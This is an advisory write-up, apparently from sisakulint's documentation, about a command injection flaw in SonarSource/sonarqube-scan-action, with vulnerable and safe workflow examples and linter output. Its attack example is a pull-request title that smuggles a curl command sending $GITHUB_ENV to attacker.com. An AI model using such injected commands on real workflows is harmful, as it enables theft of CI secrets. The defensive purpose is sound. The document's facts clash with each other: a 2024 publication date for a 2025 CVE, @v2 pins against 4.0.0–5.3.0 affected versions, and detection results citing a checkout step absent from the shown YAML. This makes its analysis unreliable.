# GHSA-f79p-9c5r-xg88

## Summary
| Field | Value |
|-------|-------|
| CVE | CVE-2025-58178 |
| Affected Action | SonarSource/sonarqube-scan-action |
| Severity | High |
| CVSS Score | 7.8/10 |
| Vulnerability Type | Command Injection (CWE-77) |
| Published | 2024-02-14 |

## Vulnerability Description

The SonarSource/sonarqube-scan-action versions 4.0.0 through 5.3.0 contains a command injection vulnerability where untrusted input arguments are processed without proper sanitization. The flaw allows arguments sent to the action to be treated as shell expressions, enabling the execution of arbitrary commands.

The vulnerability stems from improper neutralization of special elements used in commands. When untrusted input is passed to the action's parameters, attackers can inject shell metacharacters to break out of the intended command context and execute arbitrary code with workflow privileges, potentially accessing secrets and modifying repository contents.

**Affected versions:** 4.0.0 through 5.3.0 (inclusive)
**Patched versions:** 5.3.1 and later

## Vulnerable Pattern

```yaml
on:
  pull_request_target:

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: SonarSource/sonarqube-scan-action@v2
        with:
          args: ${{ github.event.pull_request.title }}
```

**Attack Vector**: An attacker creates a PR with title:
```
test; curl -X POST https://attacker.com -d @$GITHUB_ENV; echo foo
```

This injects shell commands that can exfiltrate environment variables, secrets, or execute arbitrary code in the workflow.

## Safe Pattern

```yaml
on:
  pull_request_target:

jobs:
  safe:
    runs-on: ubuntu-latest
    steps:
      - uses: SonarSource/sonarqube-scan-action@v2
        with:
          args: >
            -Dsonar.projectKey=${{ github.repository }}
            -Dsonar.sources=src
```

**Mitigation**: Never pass untrusted input directly to the `args` parameter. Use fixed, hardcoded arguments derived from trusted contexts only.

## sisakulint Detection Result

```
script/actions/advisory/GHSA-f79p-9c5r-xg88-vulnerable.yaml:9:3: dangerous trigger (critical): workflow uses privileged trigger(s) [pull_request_target] without any security mitigations. These triggers grant write access and secrets access to potentially untrusted code. Add at least one mitigation: restrict permissions (permissions: read-all or permissions: {}), use environment protection, add label conditions, or check github.actor. See https://sisaku-security.github.io/lint/docs/rules/dangeroustriggersrulecritical/ [dangerous-triggers-critical]
script/actions/advisory/GHSA-f79p-9c5r-xg88-vulnerable.yaml:17:16: checking out untrusted code from pull request in workflow with privileged trigger 'pull_request_target' (line 9). This allows potentially malicious code from external contributors to execute with access to repository secrets. Use 'pull_request' trigger instead, or avoid checking out PR code when using 'pull_request_target'. See https://sisaku-security.github.io/lint/docs/rules/untrustedcheckout/ for more details [untrusted-checkout]
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| Yes | UntrustedCheckoutRule | Yes |
| Yes | DangerousTriggersCriticalRule | Yes |

**Detection Mechanism**:
- sisakulint detects the untrusted checkout pattern at line 17 where `github.event.pull_request.head.sha` is used with `pull_request_target` trigger
- `DangerousTriggersCriticalRule` detects the use of privileged trigger without proper mitigations
- `UntrustedCheckoutRule` specifically identifies the dangerous combination of privileged trigger and PR code checkout
- This pattern allows external contributors to execute arbitrary code with access to repository secrets through the SonarQube action

## References
- [GitHub Advisory](https://github.com/advisories/GHSA-f79p-9c5r-xg88)
- [SonarSource Security Advisory](https://github.com/SonarSource/sonarqube-scan-action/security/advisories/GHSA-f79p-9c5r-xg88)
- [Fix Pull Request](https://github.com/SonarSource/sonarqube-scan-action/pull/200)
- [Patch Commit](https://github.com/SonarSource/sonarqube-scan-action/commit/016cabf33a6b7edf0733e179a03ad408ad4e88ba)
- [CVE-2025-58178](https://nvd.nist.gov/vuln/detail/CVE-2025-58178)
- [sisakulint: ArgumentInjectionRule](../argumentinjection.md)
- [sisakulint: CodeInjectionRule](../codeinjection.md)
